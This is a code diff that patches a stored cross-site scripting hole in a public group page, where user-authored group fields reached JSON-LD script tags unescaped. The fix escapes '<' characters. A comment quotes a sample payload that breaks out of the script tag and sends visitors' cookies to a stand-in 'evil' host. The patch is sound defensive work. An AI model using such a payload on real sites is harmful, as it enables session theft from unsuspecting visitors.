@@ -373,8 +373,17 @@ export default function PublicHomeGamePage({ data, serverError }) {
           <script
             key={i}
             type="application/ld+json"
-            // Safe: all data is server-fetched and JSON-serialized, not user-templated.
-            dangerouslySetInnerHTML={{ __html: JSON.stringify(entry) }}
+            // F119: JSON.stringify does NOT escape '</script>'. Group fields
+            // (name, description, host.display_name, game title/description)
+            // are user-authored. Without escaping, a host can inject
+            //   My Club</script><img src=x onerror=fetch('//evil/'+document.cookie)>
+            // as their group name and every visitor to the public slug page
+            // — including unauthenticated users — executes the payload.
+            // Escape '<' -> '\u003c'; both are valid JSON, but the escaped
+            // form can't terminate the <script> tag.
+            dangerouslySetInnerHTML={{
+              __html: JSON.stringify(entry).replace(/</g, '\\u003c')
+            }}
           />
         ))}
       </Head>
